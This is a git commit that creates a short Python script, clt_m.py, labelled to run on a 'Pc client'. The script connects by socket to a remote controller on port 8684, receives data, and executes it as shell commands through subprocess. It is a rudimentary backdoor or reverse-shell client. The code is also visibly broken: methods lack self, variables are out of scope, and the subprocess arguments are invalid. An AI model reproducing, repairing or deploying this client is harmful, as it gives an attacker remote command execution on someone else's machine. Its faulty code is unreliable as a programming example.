f85cceea45cc1d9a7bfebf7c8fcadf310e797bfb
Gabriel Boff <gabrielchagasboff@gmail.com>
2019-04-15 11:52:36 -0300

    Create clt_m.py

---
+++ clt_m.py
@@ -0,0 +1,30 @@
+#Execute on Pc client
+
+#!usr/bin/python
+
+import socket 
+import subprocess
+
+class client_m(object):
+	"""docstring for client_m"""
+	def __init__(self):
+		pass
+
+	def conMain():
+		clt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		ipc = ''
+		portc = 8684
+	
+	def coneOn():
+		try:
+			clt.connect((ipc,portc))
+			response = clt.recv(4096)
+			print('[*] @ Response : {}'.format(response))
+
+		except:
+			conMain()
+
+	def sucess():
+		while True:
+			proc = subprocess.Popen(response, shell =  True,stdin = subprocess, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+			clt.send('[*] @ Connection on')
